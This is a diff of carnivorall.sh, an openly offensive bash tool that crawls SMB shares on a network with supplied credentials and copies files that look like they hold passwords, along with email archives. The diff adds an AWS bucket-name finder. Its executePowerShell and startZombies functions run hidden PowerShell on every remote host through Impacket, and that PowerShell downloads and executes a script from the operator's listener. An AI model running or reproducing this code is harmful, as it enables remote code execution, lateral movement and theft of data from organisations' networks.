@@ -5,7 +5,7 @@
 # Authors         :L0stControl and BFlag
 # Date            :2018/10/15
 # Version         :1.0.0
-# Dependecies     :cifs-utils / smbclient / GhostScript / zip / ruby (nokogiri / httparty / colorize / yara 
+# Dependecies     :cifs-utils / smbclient / GhostScript / zip / ruby (nokogiri / httparty / colorize / yara
 #===========================================================================================================
 
 SCRIPTHOME=$(readlink -f "$0" | rev | cut -d '/' -f 2- | rev)
@@ -13,43 +13,44 @@ export PATH=$PATH:$SCRIPTHOME
 
 function banner {
     cat << EOF
-    
+
   ================================================================================================
 
-   ▄████▄   ▄▄▄       ██▀███   ███▄    █  ██▓ ██▒   █▓ ▒█████   ██▀███   ▄▄▄       ██▓     ██▓    
-  ▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ ▓██▒▓██░   █▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ▓██▒    ▓██▒    
-  ▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██▒ ▓██  █▒░▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ▒██░    ▒██░    
-  ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒░██░  ▒██ █░░▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ▒██░    ▒██░    
+   ▄████▄   ▄▄▄       ██▀███   ███▄    █  ██▓ ██▒   █▓ ▒█████   ██▀███   ▄▄▄       ██▓     ██▓
+  ▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ ▓██▒▓██░   █▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ▓██▒    ▓██▒
+  ▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██▒ ▓██  █▒░▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ▒██░    ▒██░
+  ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒░██░  ▒██ █░░▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ▒██░    ▒██░
   ▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░░██░   ▒▀█░  ░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒░██████▒░██████▒
   ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ ░▓     ░ ▐░  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░
     ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░ ▒ ░   ░ ░░    ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░
-  ░          ░   ▒     ░░   ░    ░   ░ ░  ▒ ░     ░░  ░ ░ ░ ▒    ░░   ░   ░   ▒     ░ ░     ░ ░   
+  ░          ░   ▒     ░░   ░    ░   ░ ░  ▒ ░     ░░  ░ ░ ░ ▒    ░░   ░   ░   ▒     ░ ░     ░ ░
   ░ ░            ░  ░   ░              ░  ░        ░      ░ ░     ░           ░  ░    ░  ░    ░  ░
-  ░                                               ░                                               
+  ░                                               ░
 
-  ================================================================================================             
-                --=={ Looking for sensitive information on local network }==--                                  
+  ================================================================================================
+                --=={ Looking for sensitive information on local network }==--
 
     Usage: ./carnivorall.sh [options]
-    
+
         -n, --network <CIDR>                        192.168.0.0/24
         -l, --list <inputfilename>                  List of hosts/networks
         -d, --domain <domain>                       Domain network
-        -u, --username <guest>                      Domain username 
+        -u, --username <guest>                      Domain username
         -p, --password <guest>                      Domain password
         -o, --only <contents|filenames|yara|regex>  Search ONLY by sensitve contents, filenames or yara rules
         -m, --match "user passw senha"              Strings to match inside files (not default)
         -r, --regex "4[0-9]{12}[0-9]?{3}"           Search contents using REGEX
         -y, --yara <juicy_files.txt>                Enable Yara search patterns (not default)
-        -e, --emails <y|n>                          Download all *.pst files (Prompt by default) 
+        -e, --emails <y|n>                          Download all *.pst files (Prompt by default)
         -D, --delay <Number>                        Delay between requests
-       -lD, --localfolder /path/                    For search sensitive information in local files  
+       -lD, --localfolder /path/                    For search sensitive information in local files
         -h, --help                                  Display options
         -g, --google <max items>                    Search files on the website using Google (Obs: Set to "0" to search in local files)
+        -b, --bucket "name of company"                               Permutation finder, to search for amazonaws bucket
         -w, --website "domain.com"                  Website used at *-g/--google* feature
         -v, --verbose no                            Display all matches at run time (default yes)
-        
-        Ex1: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY  
+
+        Ex1: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY
         Ex2: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o filenames
         Ex3: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o yara -y juicy_files.txt
 
@@ -60,8 +61,8 @@ function banner {
         -pP, --pspayload <payload.ps1>               Powershell payload file
         -mT, --method atexec                         Use atexec.py (Default psexec.py from Impacket)
 
-        Ex4: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -lH 192.168.1.2 -pP ./payload.ps1 -lP 80 
-        Ex5: ./carnivorall -lH 192.168.1.2 -lP 80 # Listen mode. 
+        Ex4: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -lH 192.168.1.2 -pP ./payload.ps1 -lP 80
+        Ex5: ./carnivorall -lH 192.168.1.2 -lP 80 # Listen mode.
 
 EOF
 }
@@ -70,7 +71,7 @@ EOF
 # Options parser #
 #----------------#
 
-if [ "$1" == "-h" -o "$1" == "--help" -o -z "$1" ]; then 
+if [ "$1" == "-h" -o "$1" == "--help" -o -z "$1" ]; then
     banner
     exit
 fi
@@ -83,53 +84,58 @@ KEY="$1"
 case $KEY in
     -n|--network)
     NETWORK="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -d|--domain)
     DOMAIN="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -u|--username)
     USERNAME="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -p|--password)
     PASSWORD="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -D|--delay)
     DELAY="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -m|--match)
     PATTERNMATCH="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -r|--regex)
     REGEX="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -y|--yara)
     YARAFILE="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -g|--google)
     GOOGLE="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -w|--website)
     WEBSITE="$2"
-    shift 
-    shift 
+    shift
+    shift
+    ;;
+    -b|--bucket)
+    BUCKET="$2"
+    shift
+    shift
     ;;
     -e|--emails)
     EMAILS="$2"
@@ -143,44 +149,44 @@ case $KEY in
     ;;
     -o|--only)
     ONLY="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -lH|--lhost)
     LHOST="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -lD|--localfolder)
     LFOLDER="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -pP|--pspayload)
     PSPAYLOAD="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -v|--verbose)
     VERBOSE="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -lP|--lport)
     LPORT="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     -mT|--method)
     METHOD="$2"
-    shift 
-    shift 
+    shift
+    shift
     ;;
     --default)
     DEFAULT=YES
-    shift 
+    shift
     ;;
-    *)    
+    *)
     POSITIONAL+=("$1") # save it in an array for later
     shift # past argument
     ;;
@@ -214,6 +220,7 @@ PATTERNMATCH="${PATTERNMATCH:=$(getConfs PATTERNMATCH)}"
 PIDCARNIVORALL=$$
 GOOGLE="${GOOGLE:=notset}"
 WEBSITE="${WEBSITE:=notset}"
+BUCKET="${BUCKET:=notset}"
 LHOST="${LHOST:=notset}"
 PSPAYLOAD="${PSPAYLOAD:=notset}"
 LPORT="${LPORT:=$(getConfs LPORT)}"
@@ -230,7 +237,6 @@ MNT=$(whereis mount |awk '{print $2}')
 UMNT=$(whereis umount |awk '{print $2}')
 YARA=$(whereis yara |awk '{print $2}')
 GSCRIPT=$(whereis gs |awk '{print $2}')
-RUBY=$(whereis ruby |awk '{print $2}')
 LOG=$(getConfs LOG)
 SHARES=""
 DEFAULTCOLOR="\033[0m"
@@ -242,7 +248,7 @@ MAGENTA="\033[1;35m"
 YELLOW="\033[0;33m"
 BLUE="\033[0;34m"
 EXITCTRL=0
-DEPGEMS=("nokogiri" "httparty" "colorize" "sinatra")
+
 
 #-----------#
 # Functions #
@@ -255,8 +261,8 @@ function checkDependencies
     if ! [[ ${CIFS: -9} =~ "cifscreds" ]] ; then
         echo -e "\n$RED [!] Dependecies error, you need to install$YELLOW cifs-utils$RED package $DEFAULTCOLOR\n"
         EXIT=1
-    fi    
-    
+    fi
+
     if ! [[ ${SMB: -9} =~ "smbclient" ]] ; then
         echo -e "\n$RED [!] Dependecies error, you need to install$YELLOW smbclient$RED package $DEFAULTCOLOR\n"
         EXIT=1
@@ -267,49 +273,34 @@ function checkDependencies
         EXIT=1
     fi
 
-    if ! [[ ${RUBY: -4} =~ "ruby" ]] ; then
-        echo -e "\n$RED [!] Dependecies error, you need to install$YELLOW ruby$RED package $DEFAULTCOLOR\n"
-        EXIT=1
-    fi
-
-    RUBYGEMS=$(gem list --local)
-    
-    for GEM in "${DEPGEMS[@]}"
-    do
-        if ! ( echo $RUBYGEMS | grep -i $GEM ) > /dev/null 2>&1 ; then
-            echo -e "\n$RED [!] Ruby dependecies error, please type$YELLOW gem install $GEM $DEFAULTCOLOR"
-            EXIT=1
-        fi
-    done
-
     if [ $EXIT -eq 1 ]; then
         echo
         exit
-    fi 
+    fi
 }
 
 function checkHomeFolders
 {
     if [ ! -d ~/.carnivorall ]; then
-        mkdir -p ~/.carnivorall 
-        mkdir -p $FILESFOLDER 
-        mkdir -p $MOUNTPOINT 
-        touch $SHARESFILE 
-        touch $LOG 
-    fi    
+        mkdir -p ~/.carnivorall
+        mkdir -p $FILESFOLDER
+        mkdir -p $MOUNTPOINT
+        touch $SHARESFILE
+        touch $LOG
+    fi
 }
 
 function dateLog
-{ 
+{
     MSG=$1
     echo >> $LOG
     echo " ----------------------------" >> $LOG
     echo " "$(date) >> $LOG
     echo " ----------------------------" >> $LOG
-    echo " $MSG" >> $LOG 
+    echo " $MSG" >> $LOG
 }
 
-function listShares 
+function listShares
 {
     HOSTSMB=$1
     USERNAME=$2
@@ -318,10 +309,10 @@ function listShares
     exec 2> /dev/null # GoHorse to clean the outputs
     SHARES=$($SMB -g -L \\\\$HOSTSMB $OPTIONS |grep -i "Disk" |grep -v "print")
     SHARES=$(echo $SHARES |grep -i "Disk")
-    exec 1> /dev/tty # GoHorse to clean the outputs 
+    exec 1> /dev/tty # GoHorse to clean the outputs
 }
 
-function checkReadableShare 
+function checkReadableShare
 {
     HOSTSMB=$1
     PATHSMB=$2
@@ -336,13 +327,13 @@ function scanner
 {
     HOSTS=$1
     echo 1 > /dev/shm/holdcarnivorall 2> /dev/null # Using shared memory to avoid sync problems
-    chmod -f 777 /dev/shm/holdcarnivorall 
+    chmod -f 777 /dev/shm/holdcarnivorall
     echo -e "$WHITE [-] Scanning $HOSTS $DEFAULTCOLOR"
     listShares $HOSTS $USERNAME $PASSWORD $DOMAIN
     for i in $SHARES; do
         PATHSMB=$(echo $i |awk -F"|" '{print $2}')
         READABLE=$(checkReadableShare $HOSTS $PATHSMB |tail -n1)
-        if [ "$READABLE" == "True" ];then 
+        if [ "$READABLE" == "True" ];then
             printf "%-45s %-20s \n" " [+] smb://$HOSTS/$PATHSMB/" "| READ |"
             echo "$HOSTS,$PATHSMB" >> $SHARESFILE
         fi
@@ -360,7 +351,7 @@ function generateTargets
             do
                 scanner $HOSTS &
                 sleep $DELAY
-            done 
+            done
     elif [ "$NETWORK" != "notset" ]; then
         readarray -t IPS <<< "$(generateRange.rb $NETWORK)"
         for HOSTS in "${IPS[@]}"
@@ -371,7 +362,7 @@ function generateTargets
     else
         echo -e "\n$RED [!] ERROR: $YELLOW Sintax error \n$DEFAULTCOLOR"
         exit
-    fi   
+    fi
 }
 
 function searchFilesByName
@@ -387,13 +378,13 @@ function searchFilesByName
     for p in $PATTERNMATCH
     do
         find $MOUNTPOINT -type f \( -iname "*"$p"*" -o -iname "$p*" \) -printf '%p\n' -exec cp --backup=numbered {} \
-        $FILESFOLDER/$HOSTSMB\_$PATHSMB \; |while read OUTPUTS 
+        $FILESFOLDER/$HOSTSMB\_$PATHSMB \; |while read OUTPUTS
         do
             NEWOUTPUT=$(echo $OUTPUTS | sed "s/^.\{,${#MOUNTPOINT}\}/$HOSTSMB\/$PATHSMB/")
             echo -e "$GREEN [+]$WHITE - File copied $NEWOUTPUT $DEFAULTCOLOR" |tee -a $LOG
         done
     done
-    
+
     if [ ! "$(ls -A $FILESFOLDER/$HOSTSMB\_$PATHSMB/* 2> /dev/null)" ];then
         rm -rf $FILESFOLDER/$HOSTSMB\_$PATHSMB/
     fi
@@ -406,10 +397,10 @@ function searchFilesByContent
     echo -e "\n$WHITE [+] Looking for suspicious content files in smb://$HOSTSMB/$PATHSMB"
     echo -e "$DEFAULTCOLOR"
     if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB ]; then
-        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB  
-        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp 
+        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB
+        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp
     fi
-  
+
     find $MOUNTPOINT -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp \
     $FILESFOLDER/$HOSTSMB\_$PATHSMB/ $LOG smb://$HOSTSMB/$PATHSMB/{} $MOUNTPOINT $VERBOSE \;
 
@@ -427,10 +418,10 @@ function searchFilesByRegex
     echo -e "\n$WHITE [+] Looking for suspicious content files using REGEX $REGEX on smb://$HOSTSMB/$PATHSMB"
     echo -e "$DEFAULTCOLOR"
     if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB ]; then
-        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB  
-        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp 
+        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB
+        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp
     fi
-    
+
     find $MOUNTPOINT -type f -exec checkRegex.sh {} "$REGEX" $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp $FILESFOLDER/$HOSTSMB\_$PATHSMB/ \
     $LOG smb://$HOSTSMB/$PATHSMB $MOUNTPOINT $VERBOSE \;
 
@@ -448,11 +439,11 @@ function umountTarget
     trap 2 # Enable Ctrl-C
 }
 
-function exitScan 
+function exitScan
 {
     echo -e "\n$RED............Scan stopped! keep hacking =)$DEFAULTCOLOR"
     umountTarget
-    kill -9 $PIDCARNIVORALL     
+    kill -9 $PIDCARNIVORALL
 }
 
 function mountTarget
@@ -464,8 +455,8 @@ function mountTarget
         exit
     else
         $MNT -t cifs //$HOSTSMB/$PATHSMB $MOUNTPOINT $OPTIONSMNT
-        trap exitScan 2 # Disable Ctrl-C   
-    fi    
+        trap exitScan 2 # Disable Ctrl-C
+    fi
 }
 
 function searchFilesWithYara
@@ -473,6 +464,10 @@ function searchFilesWithYara
     JUICE=$1
     echo -e "\n$GREEN [+]$WHITE Searching sensitive information with Yara smb://$HOSTSMB/$PATHSMB $DEFAULTCOLOR"
     $YARA -r $JUICE $MOUNTPOINT |tee -a $LOG
+}
+
+function searcBucket {
+  ruby bucket_finder.rb $BUCKET
 }
 
 function searchFilesWithGoogle
@@ -496,7 +491,7 @@ function searchFilesWithGoogle
         find $FILESFOLDER/$WEBSITE/downloads -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$WEBSITE/tmp \
         $FILESFOLDER/$WEBSITE/ $LOG /{} 0 $VERBOSE \;
         echo -en "\033[K\r"
-    
+
     fi
 }
 
@@ -508,13 +503,13 @@ function executePowerShell
     DOMAIN=$4
     SERVERCEC=$5
     PORTCEC=$6
-    sleep 1 
+    sleep 1
 
     if [ $METHOD == "atexec" ] ; then
         METHOD=$(getConfs ATEXEC)
     fi
 
-    ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC:$PORTCEC/ps.ps1')"    
+    ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC:$PORTCEC/ps.ps1')"
     $METHOD "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD" 2>&1 > /dev/null
 }
 
@@ -527,7 +522,7 @@ function startZombies
             do
                 executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST $LPORT 2>&1 > /dev/null &
                 sleep $DELAY
-            done 
+            done
     else
         readarray -t IPS <<< "$(generateRange.rb $NETWORK)"
         for HOSTS in "${IPS[@]}"
@@ -535,7 +530,7 @@ function startZombies
             executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST $LPORT 2>&1 > /dev/null &
             sleep $DELAY
         done
-    fi   
+    fi
 }
 
 function exitZombies
@@ -557,13 +552,13 @@ function searchLocalFilesByName
     for p in $PATTERNMATCH
     do
         find $LOCALFOLDER \( -iname "*"$p"*" -o -iname "$p*" \) -printf '%p\n' -type f -exec cp --backup=numbered {} \
-        $FILESFOLDER/$BASENAME \; |while read OUTPUTS 
+        $FILESFOLDER/$BASENAME \; |while read OUTPUTS
         do
             echo -e "$GREEN [+]$WHITE - File copied $OUTPUTS $DEFAULTCOLOR" |tee -a $LOG
         done
 
     done
-    
+
     if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
         rm -rf $FILESFOLDER/$BASENAME/
     fi
@@ -577,7 +572,7 @@ function searchLocalFilesByContent
     echo -e "$DEFAULTCOLOR"
     if [ ! -d $FILESFOLDER/$BASENAME ]; then
         mkdir $FILESFOLDER/$BASENAME
-        mkdir $FILESFOLDER/$BASENAME/tmp 
+        mkdir $FILESFOLDER/$BASENAME/tmp
     fi
 
     find $LOCALFOLDER -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$BASENAME/tmp $FILESFOLDER/$BASENAME/ \
@@ -607,9 +602,9 @@ function searchLocalFilesByRegex
 
     if [ ! -d $FILESFOLDER/$BASENAME ]; then
         mkdir $FILESFOLDER/$BASENAME
-        mkdir $FILESFOLDER/$BASENAME/tmp 
+        mkdir $FILESFOLDER/$BASENAME/tmp
     fi
-    
+
     find $LOCALFOLDER -type f -exec checkRegex.sh {} "$REGEX" $FILESFOLDER/$BASENAME/tmp \
     $FILESFOLDER/$BASENAME/ $LOG $MOUNTPOINT 0 $VERBOSE \;
 
@@ -642,13 +637,22 @@ elif [ "$GOOGLE" != "notset" -a "$WEBSITE" == "notset" ]; then
     exit
 fi
 
+if [ "$BUCKET" == "notset" ]; then
+    banner
+    echo -e "\n$RED [!] ERROR: $YELLOW You need to inform the target $DEFAULTCOLOR"
+    exit
+else
+  searcBucket
+fi
+
+
 if [ "$USERNAME" == "notset" -o $PASSWORD == "notset" ]; then
     OPTIONS="-N"
     OPTIONSMNT="-o user=,password="
 else
     OPTIONS="-U $DOMAIN\\$USERNAME%$PASSWORD"
     OPTIONSMNT="-o user=$USERNAME,password=$PASSWORD,workgroup=$DOMAIN"
-fi 
+fi
 
 if [ "$EMAILS" == "y" ];then
     echo 1 > /tmp/pstdefault
@@ -710,8 +714,8 @@ elif [ $LFOLDER != "notset" ]; then
             searchLocalFilesByName $LFOLDER
             searchLocalFilesByContent $LFOLDER
             exit
-        fi         
-    fi 
+        fi
+    fi
 
 else
     checkHomeFolders
@@ -740,41 +744,41 @@ if [ -s "$SHARESFILE" ];then
        echo -e "$DEFAULTCOLOR ( a ).... Look for files in all targets"
        if [ $REGEX != "notset" ] ; then
            echo -e "$DEFAULTCOLOR ( c ).... Change REGEX pattern, current =$RED $REGEX $DEFAULTCOLOR"
-       else 
+       else
            echo -e "$DEFAULTCOLOR ( c ).... Change pattern match(es) string(s), current = $RED[ $PATTERNMATCH ]$DEFAULTCOLOR"
        fi
-       echo -e "$DEFAULTCOLOR ( r ).... Rescan target(s)"       
-       echo -e " ( q ).... Quit" 
+       echo -e "$DEFAULTCOLOR ( r ).... Rescan target(s)"
+       echo -e " ( q ).... Quit"
        echo
        echo -en " Option ......................: "
        read OPT
        echo -e "$DEFAULTCOLOR"
-       
+
        case $OPT in
        "a")
            dateLog
-           for (( T=1; T <= $NUMBERLINESFILE; T++)) 
+           for (( T=1; T <= $NUMBERLINESFILE; T++))
            do
                TARGETHOST=$(awk "NR==$T" $SHARESFILE|awk -F"," '{print $1}')
                TARGETPATH=$(awk "NR==$T" $SHARESFILE|awk -F"," '{print $2}')
                mountTarget $TARGETHOST $TARGETPATH
-           
+
                if [ $ONLY == "filenames" ];then
                    searchFilesByName $TARGETHOST $TARGETPATH
-               
+
                elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
                    searchFilesByRegex $TARGETHOST $TARGETPATH
 
                elif [ $ONLY == "contents" ];then
                    searchFilesByContent $TARGETHOST $TARGETPATH
-                 
-               elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then 
+
+               elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
                    searchFilesWithYara $YARAFILE
-                              
+
                else
                    searchFilesByName $TARGETHOST $TARGETPATH
-                   searchFilesByContent $TARGETHOST $TARGETPATH           
-               fi  
+                   searchFilesByContent $TARGETHOST $TARGETPATH
+               fi
                umountTarget
            done
            continue
@@ -804,23 +808,23 @@ if [ -s "$SHARESFILE" ];then
            TARGETHOST=$(awk "NR==$OPT" $SHARESFILE|awk -F"," '{print $1}')
            TARGETPATH=$(awk "NR==$OPT" $SHARESFILE|awk -F"," '{print $2}')
            mountTarget $TARGETHOST $TARGETPATH
-           
+
            if [ $ONLY == "filenames" ];then
                searchFilesByName $TARGETHOST $TARGETPATH
 
            elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
                searchFilesByRegex $TARGETHOST $TARGETPATH
-           
+
            elif [ $ONLY == "contents" ];then
-               searchFilesByContent $TARGETHOST $TARGETPATH           
-           
+               searchFilesByContent $TARGETHOST $TARGETPATH
+
            elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
                searchFilesWithYara $YARAFILE
-           
+
            else
                searchFilesByName $TARGETHOST $TARGETPATH
-               searchFilesByContent $TARGETHOST $TARGETPATH           
-           fi         
+               searchFilesByContent $TARGETHOST $TARGETPATH
+           fi
            umountTarget
            trap 2
            continue
